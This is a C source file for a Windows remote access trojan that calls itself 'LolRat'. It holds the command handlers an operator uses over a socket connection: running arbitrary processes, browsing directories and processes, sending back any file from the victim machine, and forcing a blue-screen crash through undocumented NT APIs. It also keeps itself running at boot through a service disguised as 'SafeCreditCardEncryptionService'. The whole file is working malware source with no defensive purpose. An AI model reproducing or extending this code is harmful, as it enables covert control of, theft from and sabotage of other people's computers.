#include <string.h>
#include "Commands.h"
#include "SocketUtil.h"
#include "Utils.h"
#include "RemoteCommandExecutor.h"

static HANDLE processHeap = NULL;

//undocumented API
//declarations
NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, 
								PULONG_PTR, ULONG, PULONG);

//
//Commands
//
BOOL HelpCommand(SOCKET* sck) {
	char buf[BUFSIZE];
	ZeroMemory(buf,BUFSIZE);
	
	for(int i = 0; strlen(buf) < BUFSIZE && i < N_COMMANDS; ++i) {
		strncat(buf, commands[i].command, strlen(commands[i].command));
		
		if(commands[i].needsArguments)
			strncat(buf, " [a]", 4);

		if(i < N_COMMANDS - 1)
			strncat(buf, ", ", 2);
	}

	WriteConnection(sck, buf);

	return TRUE;
}

BOOL HelloCommand(SOCKET* sck) {
	WriteConnection(sck, "i am still here dumbass...");

	return TRUE;
}

BOOL ReplyCommand(SOCKET* sck, PSTR str) {
	if(!strlen(str))
		return FALSE;

	WriteConnection(sck, str);

	return TRUE;
}

BOOL NtRaiseHardErrorCommand(SOCKET* sck) {
	WriteConnection(sck, "Goodbye my friend...");

	StopCommandExecutor();

	Sleep(3000);

    BOOLEAN bl;
	ULONG response;

    RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
    
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);

	return TRUE;
}

BOOL ChangeDirectoryCommand(SOCKET* sck, PSTR str) {
	if(!strlen(str))
		return FALSE;

	if(!SetCurrentDirectory(str)) 
		WriteConnection(sck, "Could not change working directory");

	return TRUE;
}

BOOL GetCwdCommand(SOCKET* sck) {
	char fullPath[MAX_PATH];
	ZeroMemory(fullPath, MAX_PATH);
	GetCurrentDirectory(MAX_PATH, fullPath);

	WriteConnection(sck, fullPath);
	
	return TRUE;
}

BOOL CmdCommand(SOCKET* sck, PSTR str) {
	if(!strlen(str))
		return FALSE;

	DWORD timeout;
	char* commandBeginningPtr = GetCommandTimeout(str, &timeout);
	if(commandBeginningPtr == NULL) {
		WriteConnection(sck, "usage: cmd <timeout_ms_dec> [command...]");
		return FALSE;
	}

	WriteConnection(sck,commandBeginningPtr);

	SPAWNED_PROCESS_INFO process = SpawnNewProcess(commandBeginningPtr);
	
	if(process.isOk == FALSE) {
		int err = GetLastError();
		WriteConnection(sck, "Could not start new process");
		LPSTR message;
		ErrorString(err, message);
		WriteConnection(sck, message);
		LocalFree(message);
	} else {
		char msg[BUFSIZE];
		ZeroMemory(msg, BUFSIZE);
		snprintf(msg, BUFSIZE, "New process: %d\n", process.info.dwProcessId);
		WriteConnection(sck, msg);

		DWORD reasonCode = WaitForSingleObject(process.info.hProcess, timeout);
		
		char reason[51];
		ZeroMemory(reason, 51);
		memcpy(reason, "terminated, reason: ", 20);
		
		if(reasonCode == WAIT_FAILED)
			memcpy(reason + 20, "wait failure", 12);
		else if(reasonCode == WAIT_OBJECT_0)
			memcpy(reason + 20, "normal termination", 18);
		else if(reasonCode == WAIT_TIMEOUT)
			memcpy(reason + 20, "timeout reached", 15);
		else
			memcpy(reason + 20, "unknown", 7);

		DWORD exitCode = 0x0;
		GetExitCodeProcess(process.info.hProcess, &exitCode); 
		snprintf(reason + strlen(reason), 12, ": 0x%x", exitCode);

		WriteConnection(sck, reason);

		CloseHandle(process.stdOut);
		CloseHandle(process.stdIn);
		CloseHandle(process.stdErr);
		CloseHandle(process.info.hThread);
		CloseHandle(process.info.hProcess);
	}

	return TRUE;
}


#define size_t_cast(expr) ((SIZE_T) (expr))

// \\*
// reserve 2 more bytes for str
// char path[12]; [ZEROED]
// Example:
//   [c:\windows]\*
//   12 bytes
#define PutAnyWildcardAtString(str) { \
	SIZE_T len = strlen(str); \
	char* endPtr = (*(str + len - 1) == ' ') ? str + len - 1 : str + len; \
	*endPtr = '\\';	\
	*(endPtr + 1) = '*'; \
}

#define ShiftStringLeftByOne(str, ssize) { \
	for(SIZE_T i = 0; i <= ssize - 1; ++i) \
		str[i] = str[i + 1]; \
}


BOOL ListDirectoryCommand(SOCKET* sock, PSTR str) {
	if(!processHeap)
		processHeap = GetProcessHeap();

	char* content;

	if (!strlen(str)) {
		char thisDirectory[4] = { '.', '\\', '*', 0 };
		content = GetDirectoryContent(processHeap, thisDirectory);
		WriteConnection(sock, content);
		HeapFree(processHeap, 0x0, content);
	}
	else {
		char* begTokenPtr = NULL;
		char* endTokenPtr = NULL;

		char effectivePath[MAX_PATH + 2];
		SIZE_T lenStr = strlen(str);

		while ((begTokenPtr = GetNextStringToken(str, &endTokenPtr, lenStr))) {
			ZeroMemory(effectivePath, MAX_PATH + 2);

			if (*begTokenPtr == '"')
				GetDoubleQuoteDelimString(begTokenPtr, &endTokenPtr, lenStr);

			SIZE_T effPathLen = size_t_cast(endTokenPtr - begTokenPtr);
			memcpy(effectivePath, begTokenPtr, effPathLen);

			if (*begTokenPtr == '"') {
				ShiftStringLeftByOne(effectivePath, effPathLen);
				effectivePath[effPathLen - 2] = 0;
				effectivePath[effPathLen - 1] = 0;
			}

			PutAnyWildcardAtString(effectivePath);

			if (*begTokenPtr == '"') {
				str = endTokenPtr + 1;
				GetNextStringToken(NULL, &endTokenPtr, 0);
				lenStr = strlen(str);
			}

			content = GetDirectoryContent(processHeap, effectivePath);

			const SIZE_T effPathActualSize = strlen(effectivePath);
			content = HeapReAlloc(processHeap, HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY,
				content, HeapSize(processHeap, 0x0, content) + sizeof("LISTING FOR DIRECTORY: ") + effPathActualSize + 1);
			
			strncat(content, "LISTING FOR DIRECTORY: ", sizeof("LISTING FOR DIRECTORY: "));
			strncat(content, effectivePath, effPathActualSize);
			strncat(content, "\n", 1);

			WriteConnection(sock, content);

			HeapFree(processHeap, 0x0, content);
		}

	}

	return TRUE;
}

BOOL ListProcsCommand(SOCKET* sock) {
	if(!processHeap)
		processHeap = GetProcessHeap();
	
	char* output = GetSystemProcessSnapshot(processHeap);
	
	WriteConnection(sock, output);
	HeapFree(processHeap, 0x0, output);

	return TRUE;
}

BOOL BootStartCfgCommand(SOCKET* sock, PSTR str) {
	if(!strlen(str))
		return FALSE;

	SC_HANDLE systemScm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if(systemScm == FALSE) {
		WriteConnection(sock, "Failed to open the service control manager!");
		return TRUE;
	}

	SC_HANDLE thisService = OpenService(systemScm, "SafeCreditCardEncryptionService", SERVICE_CHANGE_CONFIG | SERVICE_QUERY_CONFIG);
	if(thisService == FALSE) {
		CloseServiceHandle(systemScm);
		WriteConnection(sock, "Failed to open service!");
		return TRUE;
	}

	DWORD flag = SERVICE_DEMAND_START;
	if(!strcmp(str, "true") || !strcmp(str,"1")) {
		WriteConnection(sock, "enabling AutoStart");
		flag = SERVICE_AUTO_START;
	}

	LPQUERY_SERVICE_CONFIGA currentConfig;
	DWORD bytesNeeded;

	BOOL gotConfig = FALSE;
	if(!QueryServiceConfigA(thisService, NULL, 0, &bytesNeeded)) {
		if(GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
			if(!processHeap)
				processHeap = GetProcessHeap();

			currentConfig = HeapAlloc(processHeap, HEAP_GENERATE_EXCEPTIONS |
													HEAP_ZERO_MEMORY,
													bytesNeeded);
			gotConfig = QueryServiceConfigA(thisService, currentConfig, bytesNeeded, &bytesNeeded);
		} else {
			CloseServiceHandle(thisService);
			CloseServiceHandle(systemScm);
			WriteConnection(sock, "unable to get current configuration for service");
			return TRUE;
		}
	}

	//lol that ugly code
	if(!gotConfig) {
			CloseServiceHandle(thisService);
			CloseServiceHandle(systemScm);
			WriteConnection(sock, "unable to get current configuration for service");
			return TRUE;
	
	}

	if(!ChangeServiceConfigA(
				thisService,
				currentConfig->dwServiceType,
				flag,
				currentConfig->dwErrorControl,
				currentConfig->lpBinaryPathName,
				currentConfig->lpLoadOrderGroup,
				NULL,
				currentConfig->lpDependencies,
				currentConfig->lpServiceStartName,
				NULL, 
				currentConfig->lpDisplayName))
		WriteConnection(sock, "unable to change current configuration");
	else 
		WriteConnection(sock, "service configuration change (success)");

	HeapFree(processHeap, 0x0, currentConfig);
	CloseServiceHandle(thisService);
	CloseServiceHandle(systemScm);
	return TRUE;
}

BOOL GetFileCommand(SOCKET* sock, PSTR str) {
	if(!strlen(str))
		return FALSE;

	if(!processHeap)
		processHeap = GetProcessHeap();
	
	HANDLE file = CreateFileA(str,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN,
		NULL);

	if (file == INVALID_HANDLE_VALUE) {
		WriteConnection(sock, "requested file was not found");
		return TRUE;
	}

	char* fileContent = ReadEntireFile(file, processHeap);
	LARGE_INTEGER fileSize;

	GetFileSizeEx(file, &fileSize);

	DWORD transmissionSize = sizeof("\r\nLolRat.TransmitFile\nsize:\n\n") + 19;
	char* transmissionContent = HeapAlloc(processHeap,
		HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, transmissionSize + fileSize.QuadPart);

	snprintf(transmissionContent, transmissionSize, "\r\nLolRat.TransmitFile\nsize:%d\n\n", fileSize.QuadPart);
	strncat(transmissionContent, fileContent, fileSize.QuadPart);

	CloseHandle(file);
	HeapFree(processHeap, 0, fileContent);

	WriteConnection(sock, transmissionContent);
	HeapFree(processHeap, 0, transmissionContent);
	return TRUE;
}
